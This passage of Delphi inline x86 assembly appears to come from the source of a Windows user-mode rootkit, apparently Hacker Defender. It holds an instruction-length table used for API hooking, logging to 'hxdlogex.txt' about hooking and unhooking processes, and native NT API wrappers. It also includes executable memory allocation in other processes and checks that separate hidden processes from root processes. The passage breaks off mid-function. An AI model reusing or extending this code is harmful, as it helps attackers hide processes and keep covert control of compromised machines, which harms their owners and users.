  dd C_MODRM              //02
  dd C_MODRM              //03
  dd -1                   //04
  dd -1                   //05
  dd 0                    //06
  dd -1                   //07
  dd 0                    //08
  dd 0                    //09
  dd 0                    //0A
  dd 0                    //0B
  dd -1                   //0C
  dd -1                   //0D
  dd -1                   //0E
  dd -1                   //0F
  dd -1                   //10
  dd -1                   //11
  dd -1                   //12
  dd -1                   //13
  dd -1                   //14
  dd -1                   //15
  dd -1                   //16
  dd -1                   //17
  dd -1                   //18
  dd -1                   //19
  dd -1                   //1A
  dd -1                   //1B
  dd -1                   //1C
  dd -1                   //1D
  dd -1                   //1E
  dd -1                   //1F
  dd -1                   //20
  dd -1                   //21
  dd -1                   //22
  dd -1                   //23
  dd -1                   //24
  dd -1                   //25
  dd -1                   //26
  dd -1                   //27
  dd -1                   //28
  dd -1                   //29
  dd -1                   //2A
  dd -1                   //2B
  dd -1                   //2C
  dd -1                   //2D
  dd -1                   //2E
  dd -1                   //2F
  dd -1                   //30
  dd -1                   //31
  dd -1                   //32
  dd -1                   //33
  dd -1                   //34
  dd -1                   //35
  dd -1                   //36
  dd -1                   //37
  dd -1                   //38
  dd -1                   //39
  dd -1                   //3A
  dd -1                   //3B
  dd -1                   //3C
  dd -1                   //3D
  dd -1                   //3E
  dd -1                   //3F
  dd -1                   //40
  dd -1                   //41
  dd -1                   //42
  dd -1                   //43
  dd -1                   //44
  dd -1                   //45
  dd -1                   //46
  dd -1                   //47
  dd -1                   //48
  dd -1                   //49
  dd -1                   //4A
  dd -1                   //4B
  dd -1                   //4C
  dd -1                   //4D
  dd -1                   //4E
  dd -1                   //4F
  dd -1                   //50
  dd -1                   //51
  dd -1                   //52
  dd -1                   //53
  dd -1                   //54
  dd -1                   //55
  dd -1                   //56
  dd -1                   //57
  dd -1                   //58
  dd -1                   //59
  dd -1                   //5A
  dd -1                   //5B
  dd -1                   //5C
  dd -1                   //5D
  dd -1                   //5E
  dd -1                   //5F
  dd -1                   //60
  dd -1                   //61
  dd -1                   //62
  dd -1                   //63
  dd -1                   //64
  dd -1                   //65
  dd -1                   //66
  dd -1                   //67
  dd -1                   //68
  dd -1                   //69
  dd -1                   //6A
  dd -1                   //6B
  dd -1                   //6C
  dd -1                   //6D
  dd -1                   //6E
  dd -1                   //6F
  dd -1                   //70
  dd -1                   //71
  dd -1                   //72
  dd -1                   //73
  dd -1                   //74
  dd -1                   //75
  dd -1                   //76
  dd -1                   //77
  dd -1                   //78
  dd -1                   //79
  dd -1                   //7A
  dd -1                   //7B
  dd -1                   //7C
  dd -1                   //7D
  dd -1                   //7E
  dd -1                   //7F
  dd C_DATA66             //80
  dd C_DATA66             //81
  dd C_DATA66             //82
  dd C_DATA66             //83
  dd C_DATA66             //84
  dd C_DATA66             //85
  dd C_DATA66             //86
  dd C_DATA66             //87
  dd C_DATA66             //88
  dd C_DATA66             //89
  dd C_DATA66             //8A
  dd C_DATA66             //8B
  dd C_DATA66             //8C
  dd C_DATA66             //8D
  dd C_DATA66             //8E
  dd C_DATA66             //8F
  dd C_MODRM              //90
  dd C_MODRM              //91
  dd C_MODRM              //92
  dd C_MODRM              //93
  dd C_MODRM              //94
  dd C_MODRM              //95
  dd C_MODRM              //96
  dd C_MODRM              //97
  dd C_MODRM              //98
  dd C_MODRM              //99
  dd C_MODRM              //9A
  dd C_MODRM              //9B
  dd C_MODRM              //9C
  dd C_MODRM              //9D
  dd C_MODRM              //9E
  dd C_MODRM              //9F
  dd 0                    //A0
  dd 0                    //A1
  dd 0                    //A2
  dd C_MODRM              //A3
  dd C_MODRM+C_DATA1      //A4
  dd C_MODRM              //A5
  dd -1                   //A6
  dd -1                   //A7
  dd 0                    //A8
  dd 0                    //A9
  dd 0                    //AA
  dd C_MODRM              //AB
  dd C_MODRM+C_DATA1      //AC
  dd C_MODRM              //AD
  dd -1                   //AE
  dd C_MODRM              //AF
  dd C_MODRM              //B0
  dd C_MODRM              //B1
  dd C_MODRM              //B2
  dd C_MODRM              //B3
  dd C_MODRM              //B4
  dd C_MODRM              //B5
  dd C_MODRM              //B6
  dd C_MODRM              //B7
  dd -1                   //B8
  dd -1                   //B9
  dd C_MODRM+C_DATA1      //BA
  dd C_MODRM              //BB
  dd C_MODRM              //BC
  dd C_MODRM              //BD
  dd C_MODRM              //BE
  dd C_MODRM              //BF
  dd C_MODRM              //C0
  dd C_MODRM              //C1
  dd -1                   //C2
  dd -1                   //C3
  dd -1                   //C4
  dd -1                   //C5
  dd -1                   //C6
  dd -1                   //C7
  dd 0                    //C8
  dd 0                    //C9
  dd 0                    //CA
  dd 0                    //CB
  dd 0                    //CC
  dd 0                    //CD
  dd 0                    //CE
  dd 0                    //CF
  dd -1                   //D0
  dd -1                   //D1
  dd -1                   //D2
  dd -1                   //D3
  dd -1                   //D4
  dd -1                   //D5
  dd -1                   //D6
  dd -1                   //D7
  dd -1                   //D8
  dd -1                   //D9
  dd -1                   //DA
  dd -1                   //DB
  dd -1                   //DC
  dd -1                   //DD
  dd -1                   //DE
  dd -1                   //DF
  dd -1                   //E0
  dd -1                   //E1
  dd -1                   //E2
  dd -1                   //E3
  dd -1                   //E4
  dd -1                   //E5
  dd -1                   //E6
  dd -1                   //E7
  dd -1                   //E8
  dd -1                   //E9
  dd -1                   //EA
  dd -1                   //EB
  dd -1                   //EC
  dd -1                   //ED
  dd -1                   //EE
  dd -1                   //EF
  dd -1                   //F0
  dd -1                   //F1
  dd -1                   //F2
  dd -1                   //F3
  dd -1                   //F4
  dd -1                   //F5
  dd -1                   //F6
  dd -1                   //F7
  dd -1                   //F8
  dd -1                   //F9
  dd -1                   //FA
  dd -1                   //FB
  dd -1                   //FC
  dd -1                   //FD
  dd -1                   //FE
  dd -1                   //FF
//eof GetInstructionLen

{$IFDEF LOGGING}
 {$IF Logging_Level=1}
 @LogData1a:
  db ' - suspending in ',000h
 @LogData2a:
 @LogData3a:
  db ' - hooking ',000h
 @LogData4a:
  db ' - opening ',000h
 @LogData5a:
  db ' - get peb from ',000h
 {$IFEND}
 {$IF Logging_Level=2}
 @LogData6a:
  db ' - NtQSI 16 ',000h
 @LogData7a:
  db ' - NtQVMa ',000h
 @LogData7b:
  db ' - NtQVMb ',000h
 @LogData7c:
  db ' - NtQVMc ',000h
 @LogData7d:
  db ' - NtQVMd ',000h
 @LogData7e:
  db ' - NtQVMe ',000h
 @LogData7f:
  db ' - after NtQVM bef susp ',000h
 @LogData7g:
  db ' - after susp ',000h
 {$IFEND}
 {$IF Logging_Level=4}
 @LogData8a:
  db ' - NtRVM; esp: ',000h
 @LogData8b:
  db '; Hwnd: ',000h
 @LogData8c:
  db '; Base: ',000h
 @LogData8d:
  db '; Buff: ',000h
 @LogData8e:
  db '; BLen: ',000h
 @LogData8f:
  db '; RLen: ',000h
 @LogData8g:
  db '; Main, eax: ',000h
 @LogData8h:
  db '; Main, buf before, esi: ',000h
 @LogData8i:
  db '; Main, call ',000h
 @LogData8j:
  db '; safe read bytes, edx: ',000h
 @LogData8k:
  db '; buf above, safe copy to, eax: ',000h
 @LogData8l:
  db '; change, edi: ',000h
 @LogData8m:
  db '; NtRVM_end',000h

 {$IFEND}
 {$IF Logging_Level=1}
 @LogData9a:
  db 'unhooking process ',000h

 @LogData1b:
  db '; thread id ',000h
 @LogData1c:
 @LogData2b:
  db '; method ',000h
 @LogData3b:
  db '; api ',000h
 @LogData4b:
  db '; handle ',000h
 @LogData5b:
  db '; peb ',000h
 @LogData1d:
 @LogData3c:
 @LogData4c:
 @LogData5c:
  db '; result ',000h

 @LogData9b:
  db '; api ',000h
 @LogData9c:
  db '; result ',000h
 {$IFEND}


 @LogFileName:
  db  '\',000h, '?',000h, '?',000h, '\',000h, 'c',000h, ':',000h, '\',000h, 'h',000h
  db  'x',000h, 'd',000h, 'l',000h, 'o',000h, 'g',000h, 'e',000h, 'x',000h, '.',000h
  db  't',000h, 'x',000h, 't',000h,000h,000h
  
 @LogBuffer:
  push ebp
  mov ebp,esp
  sub esp,080h
  {
   -080..-03C   -       LBuffer:array of Char
   -038..-034   -       LByteOffset:LARGE_INTEGER
   -030         -       LUnicodeString.Length
   -02E         -       LUnicodeString.MaximumLength
   -02C         -       LUnicodeString.Buffer
   -028         -       LObjectAttributes.Length:Cardinal
   -024         -       LObjectAttributes.RootDirectory:Thandle
   -020         -       LObjectAttributes.ObjectName:PUNICODE_STRING
   -01C         -       LObjectAttributes.Attributes:Cardinal
   -018         -       LObjectAttributes.SecurityDescriptor:Pointer
   -014         -       LObjectAttributes.SecurityQualityOfService:Pointer
   -010..-00C   -       LIoStatusBlock:IO_STATUS_BLOCK
   -008         -       LBytesWritten:Cardinal
   -004         -       LFileHandle:THandle
   +008         -       ABuffer:Pointer
   +00C         -       ASize:Cardinal
  }
  push esi
  push edi
  lea esi,[ebp-080h]
  lea edi,[ebx+@LogFileName]
  mov [ebp-02Ch],esi
  call @wchar_len
  xchg esi,edi
  mov ecx,eax
  rep movsb
  dec eax
  dec eax
  mov [ebp-030h],ax
  mov [ebp-02Eh],ax

  push 018h
  pop dword ptr [ebp-028h]
  lea eax,[ebp-030h]
  mov [ebp-020h],eax
  xor eax,eax
  mov [ebp-024h],eax
  push 040h
  pop dword ptr [ebp-01Ch]
  mov [ebp-018h],eax
  mov [ebp-014h],eax
  dec eax
  mov [ebp-038h],eax
  mov [ebp-034h],eax

  push 000h                     //EaLength
  push 000h                     //EaBuffer
  push 060h                     //CreateOptions = FILE_SYNCHRONOUS_IO_NONALERT or FILE_NON_DIRECTORY_FILE

  push 003h                     //CreateDisposition = FILE_OPEN_IF
  push 003h                     //ShareAccess = FILE_SHARE_READ or FILE_SHARE_WRITE
  push 080h                     //FileAttributes = FILE_ATTRIBUTE_NORMAL
  push 000h                     //AllocationSize
  lea eax,[ebp-010h]
  push eax                      //IoStatusBlock
  lea eax,[ebp-028h]
  push eax                      //ObjectAttributes
  push 040100080h               //DesiredAccess = GENERIC_WRITE or SYNCHRONIZE or FILE_READ_ATTRIBUTES
  lea eax,[ebp-004h]
  push eax                      //FileHandle
//  call [ebx+@NtCreateFileAddr]
  call @Safety_NtCreateFile
  test eax,eax
  jnz @LogBuffer_end

  push 000h                     //Key
  lea eax,[ebp-038h]
  push eax                      //ByteOffset
  push dword ptr [ebp+00Ch]     //Length        
  push dword ptr [ebp+008h]     //Buffer
  lea eax,[ebp-010h]
  push eax                      //IoStatusBlock
  push 000h                     //ApcContext
  push 000h                     //ApcRoutine
  push 000h                     //Event
  push dword ptr [ebp-004h]     //FileHandle
  call [ebx+@NtWriteFileAddr]
 @LogBuffer_CloseFile:
  push dword ptr [ebp-004h]
  call [ebx+@NtCloseAddr]
 @LogBuffer_end:
  pop edi
  pop esi
  leave
  ret 008h

 @LogEoLn_data:
  db 00Dh,00Ah

 @LogEoLn:
  push 002h
  lea eax,[ebx+@LogEoLn_data]
  push eax
  call @LogBuffer
  ret

 @LogPChar_with_length:
  push ebp
  mov ebp,esp
  {
   +008         -       AMsg:PChar
   +00C         -       ALen:Cardinal
   +010         -       AEoLn:Boolean
  }
  push dword ptr [ebp+00Ch]
  push dword ptr [ebp+008h]
  call @LogBuffer
  cmp dword ptr [ebp+010h],000h
  jz @LogPChar_with_length_end
  call @LogEoLn
 @LogPChar_with_length_end:
  leave
  ret 00Ch

 @LogPChar_without_length:
  push ebp
  mov ebp,esp
  {
   +008         -       AMsg:PChar
   +00C         -       AEoLn:Boolean
  }
  push edi
  mov edi,[ebp+008h]
  call @pchar_len
  dec eax
  push eax
  push edi
  call @LogBuffer
  cmp dword ptr [ebp+00Ch],000h
  jz @LogPChar_without_length_end
  call @LogEoLn
 @LogPChar_without_length_end:
  pop edi
  leave
  ret 008h

 @LogWLikeA_with_length:
  push ebp
  mov ebp,esp
  sub esp,0100h
  {
   -00100..-004 -       LBuffer:array of Char
   +008         -       AWStr:PWSTR
   +00C         -       ALen:Cardinal
   +010         -       AEoLn:Boolean
  }
  push esi
  push edi
  mov esi,[ebp+008h]
  lea edi,[ebp-00100h]
  push dword ptr [ebp+010h]
  push edi
  mov ecx,[ebp+00Ch]
 @LogWLikeA_with_length_copy:
  lodsw
  stosb
  loop @LogWLikeA_with_length_copy
  xor eax,eax
  stosb
  call @LogPChar_without_length
 @LogWLikeA_with_length_end:
  pop edi
  pop esi
  leave
  ret 010h

 @LogWLikeA_without_length:
  push ebp
  mov ebp,esp
  {
   +008         -       AWStr:PWSTR
   +00C         -       AEoLn:Boolean
  }

  push edi
  mov edi,[ebp+008h]
  call @wchar_len
  push dword ptr [ebp+00Ch]
  push eax
  push edi
  call @LogWLikeA_with_length
  pop edi
  leave
  ret 008h

 @LogIntAsString:
  push ebp
  mov ebp,esp
  sub esp,010h
  {
   -010..-004   -       LBuffer:array of Char
   +008         -       AInt:Cardinal
   +00C         -       AEoLn:Boolean
  }
  push edi
  lea edi,[ebp-005h]
  mov byte ptr [edi],000h
  mov eax,[ebp+008h]
  push 00Ah
  pop ecx

 @LogIntAsString_itoa:
  xor edx,edx
  div ecx
  add edx,030h
  dec edi
  mov [edi],dl
  test eax,eax
  jnz @LogIntAsString_itoa
  push dword ptr [ebp+00Ch]
  push edi
  call @LogPChar_without_length
 @LogIntAsString_end:
  pop edi
  leave
  ret 008h
{$ENDIF}


 @OpenFileMapping:
  push ebp
  mov ebp,esp
  sub esp,064h
  {
   -064         -       LViewSize:Cardinal
   -060..-02C   -       LBuf:array[0..51] of Char
   -028         -       LSecHandle:THandle
   -024..-020   -       LSecName:UNICODE_STRING
   -01C..-008   -       LObjAttr:TObjectAdributes
   -004         -       LResult:Cardinal
  }
  push esi
  push edi
  xor eax,eax

  push 018h
  pop dword ptr [ebp-01Ch]
  mov [ebp-018h],eax
  lea ecx,[ebp-024h]
  mov [ebp-014h],ecx
  mov [ebp-010h],eax
  mov [ebp-00Ch],eax
  mov [ebp-008h],eax

  lea edi,[ebx+@BaseNamedObjectsName]
  call @pchar_len
  mov ecx,eax
  dec eax
  shl eax,001h
  mov [ebp-024h],ax
  mov [ebp-022h],ax
  mov esi,edi
  lea edi,[ebp-060h]
  mov [ebp-020h],edi
 @OpenFileMapping_widestring_basenamedobjects:
  lodsb
  stosw
  loop @OpenFileMapping_widestring_basenamedobjects

  lea eax,[ebp-01Ch]
  push eax                                      //ObjectAttributes
  push 00Fh                                     //DesiredAccess = DIRECTORY_ALL_ACCESS
  lea eax,[ebp-018h]                            //DirectoryHandle
  push eax
  call [ebx+@NtOpenDirectoryObjectAddr]

  lea edi,[ebx+@FileMappingName]
  call @pchar_len
  mov ecx,eax
  dec eax
  shl eax,001h
  mov [ebp-024h],ax
  mov [ebp-022h],ax
  mov esi,edi
  lea edi,[ebp-060h]
  mov [ebp-020h],edi
 @OpenFileMapping_widestring:
  lodsb
  stosw
  loop @OpenFileMapping_widestring

  xor esi,esi
  mov [ebp-064h],esi
  mov [ebp-004h],esi

  lea eax,[ebp-01Ch]
  push eax                                      //ObjectAttributes
  push 004h                                     //DesiredAccess = SECTION_MAP_READ
  lea eax,[ebp-028h]
  push eax                                      //SectionHandle
  call [ebx+@NtOpenSectionAddr]
  test eax,eax
  jnz @OpenFileMapping_end

  push 002h                                     //Protect = PAGE_READONLY
  push 000100000h                               //AllocationType = MEM_TOP_DOWN
  push 002h                                     //InheritDisposition
  lea eax,[ebp-064h]
  push eax                                      //ViewSize
  push esi                                      //SectionOffset
  push esi                                      //CommitSize
  push esi                                      //ZeroBits
  lea eax,[ebp-004h]
  push eax                                      //BaseAddress
  dec esi
  push esi                                      //ProcessHandle
  push dword ptr [ebp-028h]                     //SectionHandle
  call [ebx+@NtMapViewOfSectionAddr]
  mov eax,[ebp-004h]

 @OpenFileMapping_CloseSection:
  push dword ptr [ebp-018h]                     //DirectoryHandle
  call [ebx+@NtCloseAddr]
  push dword ptr [ebp-028h]
  call [ebx+@NtCloseAddr]

 @OpenFileMapping_end:
  mov eax,[ebp-004h]
  pop edi
  pop esi
  leave
  ret

 @CloseFileMapping:
  push dword ptr [esp+004h]
  push -001h
  call [ebx+@NtUnmapViewOfSectionAddr]
  ret 004h

 @OpenDriver:
  push ebp
  mov ebp,esp
  sub esp,060h
  {
   -060..-03C   -       LBuffer:array of Char
   -038..-034   -       LByteOffset:LARGE_INTEGER
   -030         -       LUnicodeString.Length
   -02E         -       LUnicodeString.MaximumLength
   -02C         -       LUnicodeString.Buffer
   -028         -       LObjectAttributes.Length:Cardinal
   -024         -       LObjectAttributes.RootDirectory:Thandle
   -020         -       LObjectAttributes.ObjectName:PUNICODE_STRING
   -01C         -       LObjectAttributes.Attributes:Cardinal
   -018         -       LObjectAttributes.SecurityDescriptor:Pointer
   -014         -       LObjectAttributes.SecurityQualityOfService:Pointer
   -010..-00C   -       LIoStatusBlock:IO_STATUS_BLOCK
   -008         -       LBytesWritten:Cardinal
   -004         -       LResult:Pointer
  }
  push esi
  push edi

  lea esi,[ebp-060h]
  lea edi,[ebx+@cDriverDeviceName]
  mov [ebp-02Ch],esi
  call @wchar_len
  xchg esi,edi
  mov ecx,eax
  rep movsb
  dec eax
  dec eax
  mov [ebp-030h],ax
  mov [ebp-02Eh],ax

  push 018h
  pop dword ptr [ebp-028h]
  lea eax,[ebp-030h]
  mov [ebp-020h],eax
  xor eax,eax
  mov [ebp-024h],eax
  push 040h
  pop dword ptr [ebp-01Ch]
  mov [ebp-018h],eax
  mov [ebp-014h],eax
  dec eax
  mov [ebp-038h],eax
  mov [ebp-034h],eax

  push 000h                     //EaLength
  push 000h                     //EaBuffer
  push 060h                     //CreateOptions = FILE_SYNCHRONOUS_IO_NONALERT or FILE_NON_DIRECTORY_FILE
  push 001h                     //CreateDisposition = FILE_OPEN
  push 003h                     //ShareAccess = FILE_SHARE_READ or FILE_SHARE_WRITE
  push 000h                     //FileAttributes
  push 000h                     //AllocationSize
  lea eax,[ebp-010h]
  push eax                      //IoStatusBlock
  lea eax,[ebp-028h]
  push eax                      //ObjectAttributes
  push 010100080h               //DesiredAccess = GENERIC_ALL or SYNCHRONIZE or FILE_READ_ATTRIBUTES
  lea eax,[ebp-004h]
  push eax                      //FileHandle
//  call [ebx+@NtCreateFileAddr]
  call @Safety_NtCreateFile

  mov eax,[ebp-004h]
  pop edi
  pop esi
  leave
  ret

 @LocalAllocMem:                                //allocates memory for local process
                                                //and returns pointer on it
  push dword ptr [esp+004h]                     //Size
  push -001h                                    //ProcessHandle
  call @GlobalAllocMem
  ret 004h

 @LocalFreeMem:                                 //frees memory for local process
                                                //returns NTSTATUS
  push dword ptr [esp+004h]                     //Addr
  push -001h                                    //ProcessHandle
  call @GlobalFreeMem
  ret 004h

 @GlobalAllocMem:                               //allocates memory for any process
                                                //and returns pointer on it
  sub esp,004h                                  //Result
  {
   -004         -       LResult:Cardinal
   +004         -       LProcHandle:THandle
   +008         -       LSize:Cardinal
  }
  push PAGE_EXECUTE_READWRITE                   //Protect
  push 000101000h                               //AllocationType = MEM_TOP_DOWN | MEM_COMMIT
  lea eax,[esp+014h]
  push eax                                      //AllocationSize = LSize
  push 000h                                     //ZeroBits
  lea eax,[esp+010h]
  push 000h
  pop dword ptr [eax]
  push eax                                      //BaseAddress
  push dword ptr [esp+01Ch]                     //ProcessHandle = LProcHandle
  call [ebx+@NtAllocateVirtualMemoryAddr]
  mov eax,[esp]
  add esp,004h
  ret 008h

 @GlobalFreeMem:                                //frees memory for any process
                                                //returns NTSTATUS
  sub esp,004h
  {
   -004         -       LFreeSize:Cardinal
   +004         -       LProcHandle:THandle
   +008         -       LAddr:Pointer
  }

  push 000008000h                               //FreeType = MEM_RELEASE
  lea eax,[esp+004h]
  push 000h
  pop dword ptr [eax]
  push eax                                      //BaseAddress = LAddr
  lea eax,[esp+014h]
  push eax                                      //FreeSize
  push dword ptr [esp+014h]                     //ProcessHandle = LProcHandle
  call [ebx+@NtFreeVirtualMemoryAddr]
  add esp,004h
  ret 008h


 @GetInfoTable:                                 //returns pointer on newly allocated table
                                                //with information from NtQuerySystemInformation
  push ebp
  mov ebp,esp
  sub esp,004h
  {
   -004         -       LResult:Pointer
   +008         -       ATableType:Cardinal
  }
  push esi
  push 000h
  pop dword ptr [ebp-004h]
  mov esi,000004000h
 @GetInfoTable_doublespace:
  shl esi,001h
  push esi
  call @LocalAllocMem

  test eax,eax
  jz @GetInfoTable_failed
  mov [ebp-004h],eax

  push 000h                                     //ReturnLength
  push esi                                      //SystemInformationLength
  push eax                                      //SystemInformation
  push dword ptr [ebp+008h]                     //SystemInformationClass
  call @Safety_NtQuerySystemInformation
  test eax,0C0000000h                           //SEVERITY_ERROR
  jz @GetInfoTable_end                          //STATUS_SUCCESS
  cmp eax,0C0000004h                            //STATUS_INFO_LENGTH_MISMATCH
  jnz @GetInfoTable_failed
  push dword ptr [ebp-004h]
  call @LocalFreeMem
  jmp @GetInfoTable_doublespace
 @GetInfoTable_failed:
  push 000h
  pop dword ptr [ebp-004h]

 @GetInfoTable_end:
  mov eax,[ebp-004h]
  pop esi
  leave
  ret 004h


 @CheckProcess:                                 //returns true if process has CheckType feature
  push ebp
  mov ebp,esp
  sub esp,008h
  {
   -008         -       LProcTable:Pointer
   -004         -       LResult:Boolean
   +008         -       APID:Cardinal
   +00C         -       ACheckType:Cardinal

    CheckType   - 0 = ctHiddenProcess
                - 1 = ctRootProcess
  }

  push esi

  push 000h
  pop dword ptr [ebp-004h]

  push 005h                                     //ATableType = SystemProcessesAndThreadsInformation
  call @GetInfoTable
  test eax,eax
  jz @CheckProcess_end
  mov [ebp-008h],eax
  mov esi,eax

  //we want to see only processes without CheckType freature
  push dword ptr [ebp+00Ch]                     //ProcessType
  push eax                                      //Buffer
  call @ProcessSystemProcessesAndThreadsInformationBuffer

 @CheckProcess_GetProcess:
  mov eax,[esi+044h]                            //ProcessID
  cmp eax,[ebp+008h]
  jz @CheckProcess_FreeTable
  mov edx,[esi]
  add esi,edx
  test edx,edx
  jnz @CheckProcess_GetProcess
  push 001h
  pop [ebp-004h]
 @CheckProcess_FreeTable:
  push dword ptr [ebp-008h]
  call @LocalFreeMem

 @CheckProcess_end:
  mov eax,[ebp-004h]
  pop esi
  leave
  ret 008h

 @Sleep:                                        //wait AInterval ms
  push ebp
  mov ebp,esp
  sub esp,008h
  {
   -008..-004  -        LLargeInt:LARGE_INTEGER
   +008         -       AInterval:Cardinal
  }

  mov eax,[ebp+008h]
  mov ecx,000002710h                            //10^4
  mul ecx
  lea ecx,[ebp-008h]
  neg eax
  mov [ecx],eax
  or [ecx+004h],-001h

  push ecx                                      //Interval
  push 000h                                     //Alertable
  call [ebx+@NtDelayExecutionAddr]
  leave
  ret 004h

 @OpenFile:                                     //open file given as 1st argument
  push ebp
  mov ebp,esp
  sub esp,00400h
  {
   -0400..-0200 -       LBuffer
   -038         -       LAnsiString.Length
   -036         -       LAnsiString.MaximumLength
   -034         -       LAnsiString.Buffer
   -030         -       LUnicodeString.Length
   -02E         -       LUnicodeString.MaximumLength
   -02C         -       LUnicodeString.Buffer
   -028         -       LObjectAttributes.Length:Cardinal
   -024         -       LObjectAttributes.RootDirectory:Thandle
   -020         -       LObjectAttributes.ObjectName:PUNICODE_STRING
   -01C         -       LObjectAttributes.Attributes:Cardinal
   -018         -       LObjectAttributes.SecurityDescriptor:Pointer
   -014         -       LObjectAttributes.SecurityQualityOfService:Pointer
   -010..-00C   -       LIoStatusBlock:IO_STATUS_BLOCK
   -008         -       LHandle:THandle
   -004         -       LResult:Cardinal
   +008         -       AFileName:Cardinal
  }
  push edi

  lea eax,[ebp-030h]                            //LUnicodeString
  mov [ebp-020h],eax                            //LObjectAttributes.ObjectName
  xor eax,eax
  push 018h
  pop dword ptr [ebp-028h]                      //LObjectAttributes.Length
  mov [ebp-024h],eax                            //LObjectAttributes.RootDirectory
  push 040h
  pop dword ptr [ebp-01Ch]                      //LObjectAttributes.Attributes
  mov [ebp-018h],eax                            //LObjectAttributes.SecurityDescriptor
  mov [ebp-014h],eax                            //LObjectAttributes.SecurityQualityOfService

  mov [ebp-030h],eax                            //LUnicodeString

  dec eax
  mov [ebp-004h],eax                            //LResult

  mov [ebp-02Eh],00200h                         //LUnicodeString.MaximumLength

  push dword ptr [ebp+008h]                     //SourceString
  lea eax,[ebp-038h]
  push eax                                      //DestinationString
  call [ebx+@RtlInitAnsiStringAddr]

  lea eax,[ebp-00400h]
  mov [ebp-02Ch],eax                            //LUnicodeString.Buffer

  push 000h                                     //AllocateDestinationString
  lea eax,[ebp-038h]
  push eax                                      //SourceString
  lea eax,[ebp-030h]
  push eax                                      //DestinationString
  call [ebx+@RtlAnsiStringToUnicodeStringAddr]
                  
  push 000h                     //EaLength
  push 000h                     //EaBuffer
  push 060h                     //CreateOptions = FILE_SYNCHRONOUS_IO_NONALERT or FILE_NON_DIRECTORY_FILE
  push 001h                     //CreateDisposition = FILE_OPEN
  push 003h                     //ShareAccess = FILE_SHARE_READ or FILE_SHARE_WRITE
  push 080h                     //FileAttributes = FILE_ATTRIBUTE_NORMAL
  push 000h                     //AllocationSize
  lea eax,[ebp-010h]
  push eax                      //IoStatusBlock
  lea eax,[ebp-028h]
  push eax                      //ObjectAttributes
  push 040100080h               //DesiredAccess = GENERIC_WRITE or SYNCHRONIZE or FILE_READ_ATTRIBUTES
  lea eax,[ebp-008h]
  push eax                      //FileHandle
  call @Safety_NtCreateFile
  test eax,eax
  jnz @OpenFile_end
  mov eax,[ebp-008h]            //LHandle
  mov [ebp-004h],eax            //LResult

 @OpenFile_end:
  mov eax,[ebp-004h]            //LResult
  pop edi
  leave
  ret 004h

 @pchar_len:                                    //@pchar -> edi
                                                //returns length of null-terminated pchar string
  push edi
  xor eax,eax
  xor ecx,ecx
  dec ecx
  repnz scasb
  dec eax
  sub eax,ecx
  pop edi
  ret

 @wchar_len:                                    //@wchar -> edi
                                                //returns length of null-terminated wchar string
  push edi
  xor eax,eax
  xor ecx,ecx
  dec ecx
  repnz scasw
  dec eax
  sub eax,ecx
  shl eax,001h
  pop edi
  ret

 @cmp2pchars_casesens:                          //compares two null-terminated pchar strings
                                                //compare is case sensitive
                                                //returns 1 if strings are equal, 0 if not
                                                //@pchar1 -> esi; @pchar2 -> edi
  push esi
  push edi
  call @pchar_len
  mov ecx,eax
  rep cmpsb
  setz al
  pop edi
  pop esi
  ret

 @upchar_al:                                    //returns upcase chare stored in al
  cmp al,061h
  jb @upchar_al_end
  cmp al,07Ah
  jnbe @upchar_al_end
  sub al,020h
  @upchar_al_end:
  ret

 @cmp2pchars_caseinsens:                        //compares two null-terminated pchar strings
                                                //compare is case insensitive
                                                //returns 1 if strings are equal, 0 if not
                                                //@pchar1 -> esi; @pchar2 -> edi
  push esi
  push edi
  call @pchar_len
  mov ecx,eax

 @cmp2pchars_caseinsens_nextchar:
  lodsb
  call @upchar_al
  mov ah,al
  xchg esi,edi
  lodsb
  call @upchar_al
  xchg esi,edi
  sub al,ah
  jnz @cmp2pchars_caseinsens_noteq
  test ah,ah
  jz @cmp2pchars_caseinsens_eq
  loop @cmp2pchars_caseinsens_nextchar
  @cmp2pchars_caseinsens_eq:
  push 001h
  pop eax
  jmp @cmp2pchars_caseinsens_end

 @cmp2pchars_caseinsens_noteq:
  xor eax,eax

 @cmp2pchars_caseinsens_end:
  pop edi
  pop esi
  ret

 @cmp2pchars_caseinsens_with_wildcard:          //compares two null-terminated pchar strings
                                                //compare is case insensitive with wildcard
                                                //returns 1 if strings are equal, 0 if not
                                                //@pchar1 -> esi; @pchar2 with wildcard -> edi
  push esi
  push edi
  call @pchar_len
  mov ecx,eax

 @cmp2pchars_caseinsens_with_wildcard_nextchar:
  lodsb
  call @upchar_al
  mov ah,al
  xchg esi,edi
  lodsb
  call @upchar_al
  xchg esi,edi
  cmp ah,02Ah                                   //wildcard
  jz @cmp2pchars_caseinsens_with_wildcard_eq
  cmp al,02Ah                                   //wildcard
  jz @cmp2pchars_caseinsens_with_wildcard_eq
  sub al,ah
  jnz @cmp2pchars_caseinsens_with_wildcard_noteq
  test ah,ah
  jz @cmp2pchars_caseinsens_with_wildcard_eq
  loop @cmp2pchars_caseinsens_with_wildcard_nextchar
  @cmp2pchars_caseinsens_with_wildcard_eq:
  push 001h
  pop eax
  jmp @cmp2pchars_caseinsens_with_wildcard_end

 @cmp2pchars_caseinsens_with_wildcard_noteq:
  xor eax,eax

 @cmp2pchars_caseinsens_with_wildcard_end:
  pop edi
  pop esi
  ret


 @cmp_wide_pchar_caseinsens:                    //compares null-terminated pchar and wchar string
                                                //compare is case insensitive
                                                //returns 1 if strings are equal, 0 if not
                                                //@wide -> esi; @pchar -> edi
  push esi
  push edi
  call @pchar_len
  mov ecx,eax

 @cmp_wide_pchar_caseinsens_nextchar:
  xchg esi,edi
  lodsb
  call @upchar_al
  mov ah,al
  xchg esi,edi
  lodsb
  call @upchar_al
  sub al,ah
  jnz @cmp_wide_pchar_caseinsens_noteq
  test ah,ah
  jz @cmp_wide_pchar_caseinsens_eq
  lodsb
  test al,al
  jnz @cmp_wide_pchar_caseinsens_noteq
  loop @cmp_wide_pchar_caseinsens_nextchar
  @cmp_wide_pchar_caseinsens_eq:
  push 001h
  pop eax
  jmp @cmp_wide_pchar_caseinsens_end

  @cmp_wide_pchar_caseinsens_noteq:
  xor eax,eax

 @cmp_wide_pchar_caseinsens_end:
  pop edi
  pop esi
  ret

 @cmp_wide_pchar_caseinsens_with_wildcard:      //compares null-terminated pchar and wchar string
                                                //compare is case insensitive with wildcard
                                                //returns 1 if strings are equal, 0 if not
                                                //@wide -> esi; @pchar with wildcard -> edi
  push esi
  push edi
  call @pchar_len
  mov ecx,eax

 @cmp_wide_pchar_caseinsens_with_wildcard_nextchar:
  xchg esi,edi
  lodsb
  call @upchar_al
  mov ah,al
  xchg esi,edi
